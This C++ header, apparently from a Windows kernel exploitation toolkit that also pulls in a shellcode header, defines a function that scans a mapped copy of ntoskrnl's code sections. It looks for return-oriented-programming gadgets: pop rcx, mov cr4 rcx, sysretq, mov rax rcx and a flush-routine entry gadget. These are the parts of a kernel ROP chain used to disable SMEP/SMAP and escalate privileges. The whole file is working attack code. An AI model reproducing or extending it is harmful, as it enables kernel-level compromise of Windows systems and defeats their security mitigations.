#pragma once
#include <msrkit/detail/constants.h>
#include <msrkit/detail/shellcode.h>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstddef>
#include <cstdint>

namespace MSRK::detail
{
    inline bool FIND_GADGETS(std::uintptr_t NTOSKRNL_LOCAL, std::uintptr_t NTOSKRNL)
    {
        if (!NTOSKRNL_LOCAL || !NTOSKRNL) return false;

        const auto DOS_HEADER    = (PIMAGE_DOS_HEADER)NTOSKRNL_LOCAL;
        const auto NT_HEADER     = (PIMAGE_NT_HEADERS)(NTOSKRNL_LOCAL + DOS_HEADER->e_lfanew);
        const auto SECTION_TABLE = IMAGE_FIRST_SECTION(NT_HEADER);
        const auto SECTION_COUNT = NT_HEADER->FileHeader.NumberOfSections;

        for (WORD i = 0; i < SECTION_COUNT; ++i)
        {
            if ( !(SECTION_TABLE[i].Characteristics & IMAGE_SCN_CNT_CODE) ||
                 (SECTION_TABLE[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE) )
            {
                continue;
            }

            const auto SECTION_ADDRESS = NTOSKRNL + SECTION_TABLE[i].VirtualAddress;
            const auto SECTION_LOCAL   = NTOSKRNL_LOCAL + SECTION_TABLE[i].VirtualAddress;
            const auto SECTION_SIZE    = SECTION_TABLE[i].Misc.VirtualSize;

            if (SECTION_SIZE < 10) continue;

            for (std::size_t OFFSET = 0; OFFSET < SECTION_SIZE - 10; ++OFFSET)
            {
                const auto BYTE_PTR       = (const std::uint8_t*)(SECTION_LOCAL + OFFSET);
                const auto GADGET_ADDRESS = SECTION_ADDRESS + OFFSET;

                const auto VALUE_16 = *(const std::uint16_t*)BYTE_PTR;
                const auto VALUE_32 = *(const std::uint32_t*)BYTE_PTR;

                if (!POP_RCX_RET && VALUE_16 == (std::uint16_t)SIG_POP_RCX_RET)
                {
                    POP_RCX_RET = GADGET_ADDRESS;
                }

                if (!MOV_CR4_RCX_RET && VALUE_32 == (std::uint32_t)SIG_MOV_CR4_RCX_RET)
                {
                    MOV_CR4_RCX_RET = GADGET_ADDRESS;
                }

                if (!SYSRETQ_RET && (VALUE_32 & 0xFFFFFFU) == (std::uint32_t)(SIG_SYSRETQ & 0xFFFFFFU))
                {
                    SYSRETQ_RET = GADGET_ADDRESS;
                }

                if (!MOV_RAX_RCX_RET && VALUE_32 == (std::uint32_t)SIG_MOV_RAX_RCX_RET)
                {
                    MOV_RAX_RCX_RET = GADGET_ADDRESS;
                }

                if (!ENTRY_GADGET && OFFSET + 0x1B <= SECTION_SIZE)
                {
                    const auto PATTERN_LO = *(const std::uint64_t*)BYTE_PTR;

                    if ((PATTERN_LO & 0xFFFFFFFFFFFFULL) == (SIG_KE_FLUSH_LO & 0xFFFFFFFFFFFFULL))
                    {
                        const auto PATTERN_HI = *(const std::uint32_t*)(BYTE_PTR + 6);

                        if (PATTERN_HI == (std::uint32_t)SIG_KE_FLUSH_HI)
                        {
                            const auto PATTERN_TAIL = *(const std::uint32_t*)(BYTE_PTR + 0x17);

                            if (PATTERN_TAIL == (std::uint32_t)SIG_KE_FLUSH_TAIL)
                            {
                                ENTRY_GADGET = GADGET_ADDRESS;
                            }
                        }
                    }
                }

                if (POP_RCX_RET && MOV_CR4_RCX_RET && SYSRETQ_RET && MOV_RAX_RCX_RET && ENTRY_GADGET)
                {
                    return true;
                }
            }
        }

        return POP_RCX_RET && MOV_CR4_RCX_RET && SYSRETQ_RET && MOV_RAX_RCX_RET && ENTRY_GADGET;
    }
}
